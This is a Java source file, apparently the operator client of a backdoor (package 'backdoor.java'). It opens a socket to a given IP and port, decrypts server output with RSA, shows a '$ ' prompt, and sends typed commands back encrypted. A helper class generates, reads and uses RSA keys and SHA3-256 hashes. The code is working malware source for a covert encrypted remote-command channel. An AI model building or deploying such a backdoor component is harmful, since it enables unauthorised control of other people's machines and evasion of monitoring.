package backdoor.java;

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import java.net.Socket;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.EncodedKeySpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;

import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;


public class Client {

    public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException {
        
        final String IP = new String(args[0]);
        final int PORT = Integer.parseInt(args[1]);

        Socket client = new Socket(IP, PORT);
        int count = 0;
        
        try{

            ObjectInputStream inputStream = new ObjectInputStream(client.getInputStream());
            ObjectOutputStream outputStream = new ObjectOutputStream(client.getOutputStream());  
            File privateKeyFile = new File("../../../../../keystore/privateKeyFile.bin");        
            File publicKeyFile = new File("../../../../../keystore/publicKeyFile.bin");

            while(client.isConnected()){

                /* realizar o decode da log ou mensagem recebido pelo servidor */
                String decodedMessage = Cryptography.decryptMesage((String)inputStream.readObject(), privateKeyFile);
                System.out.println("\n" + decodedMessage);
                count += 1;
                if (count > 1 ){
                    String hashMessage = (String)inputStream.readObject();
                    System.out.println(hashMessage + "\n");
                }
                
                /* resgatar o input do cliente */
                String outputMessage = System.console().readLine("$ ");

                /* enviar o input criptografado para o servidor */
                outputStream.writeObject(Cryptography.encryptMessage(outputMessage, publicKeyFile));

                if("exit".equals(outputMessage)){

                    inputStream.close();
                    outputStream.flush();
                    outputStream.close(); 
                    client.close();
                    
                    break;
                }
                
            }

        } catch (Exception exception) {
            exception.printStackTrace();
        }

    }

}

class Cryptography {
    
    public static void createRSAKeys(File publicKeyFile, File privateKeyFile)
    throws NoSuchAlgorithmException, FileNotFoundException, IOException {

        /* instanciar o algoritimo de chave */
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        KeyPair pair = generator.genKeyPair();

        /* escrever chave publica */
        try(FileOutputStream fileOutputStream = new FileOutputStream(publicKeyFile)){
            fileOutputStream.write(pair.getPublic().getEncoded());
        }
        
        /* escrever chave privada */
        try(FileOutputStream fileOutputStream = new FileOutputStream(privateKeyFile)){
            fileOutputStream.write(pair.getPrivate().getEncoded());
        }

    }

    public static PublicKey readRSAPublicKey(File publicKeyFile) 
    throws IOException, NoSuchAlgorithmException, InvalidKeySpecException {

        /* ler os bytes da chave publica */
        byte[] publicKeyBytes = Files.readAllBytes(publicKeyFile.toPath());

        /* reconhecer o algoritimo RSA */
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");

        /* analisar a chave no padrão de codificação X509 */
        EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);
        return keyFactory.generatePublic(publicKeySpec);

    }

    public static PrivateKey readRSAPrivateKey(File privateKeyFile)
    throws NoSuchAlgorithmException, IOException, InvalidKeySpecException {

        /* ler os bytes da chave privada */
        byte[] privateKeyBytes = Files.readAllBytes(privateKeyFile.toPath());

        /* reconhecer o algoritimo RSA */
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");

        /* analisar a chave no padrão de codificação PKCS8 */
        EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyBytes);
        return keyFactory.generatePrivate(privateKeySpec);

    }

    public static String encryptMessage(String message, File publicKeyFile) 
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        /* encriptar a mensagem passada a partir do algoritimo RSA */
        Cipher encryptCipher = Cipher.getInstance("RSA");

        /* analizar a chave publica */
        encryptCipher.init(Cipher.ENCRYPT_MODE, readRSAPublicKey(publicKeyFile));
        
        /* gerar os bytes da mensagemm com o padrão UTF-8 para não zuar a acentuação */
        byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);
        byte[] encryptMessageBytes = encryptCipher.doFinal(messageBytes);

        /* retornar a encriptografia da mensagem */
        return Base64.getEncoder().encodeToString(encryptMessageBytes);

    }


    public static String decryptMesage(String encryptMessage, File privateKeyFile)
    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {

        /* espicificar o algoritimo para descriptografia */
        Cipher decryptCipher = Cipher.getInstance("RSA");

        /* ler a chave privada */
        decryptCipher.init(Cipher.DECRYPT_MODE, readRSAPrivateKey(privateKeyFile));

        /* realizar o decode da mensagem em bytes */
        byte[] decryptMessageBytes = decryptCipher.doFinal(Base64.getDecoder().decode(encryptMessage));
        return new String(decryptMessageBytes, StandardCharsets.UTF_8);

    }

    public static String hashMessage(String message) throws NoSuchAlgorithmException{
        
        /* instanciar algoritimo de hash SHA3-256 */
        final MessageDigest digest = MessageDigest.getInstance("SHA3-256");

        /* gerar a hash de acordo com o padrão UTF-8 para não haver perdas durante o processo */
        final byte[] hashBytes = digest.digest(message.getBytes(StandardCharsets.UTF_8));
        
        /* retornar a hash em hexadecimal */
        return bytesToHex(hashBytes);
    
    }

    private static String bytesToHex(byte[] hash){

        /* instanciar montagem da string hexadecimal a partir do array de bytes */
        StringBuilder hexString = new StringBuilder(2 * hash.length);

        /* montar a string hexadecimal em cima de cada byte da hash */
        for (byte b : hash){
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) { hexString.append('0'); }
            hexString.append(hex);
        }
        
        return hexString.toString();

    }
}
